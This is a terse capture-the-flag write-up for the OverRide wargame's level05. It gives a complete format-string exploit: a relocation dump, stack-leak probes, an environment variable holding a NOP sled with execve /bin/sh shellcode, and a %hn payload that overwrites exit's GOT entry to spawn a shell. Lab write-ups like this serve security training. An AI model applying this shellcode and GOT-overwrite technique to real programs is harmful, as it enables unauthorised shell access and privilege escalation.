# Level05


```
./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main
```

```
level05@OverRide:~$ python -c 'print "B"*4 + "%08x."*20' | ./level05
bbbb00000064.f7fcfac0.f7ec3add.ffffd66f.ffffd66e.00000000.ffffffff.ffffd6f4.f7fdb000.62626262.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.
```

```
level05@OverRide:~$ ./level05
BBBB%10$p
bbbb0x62626262
```

```
export SHELLCODE=`python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x
68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"'`
```

Find the adress of the NOP sled

0xffffd8d0


(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55496x%10$hn%10031x%11$hn"'; cat) | ./level05
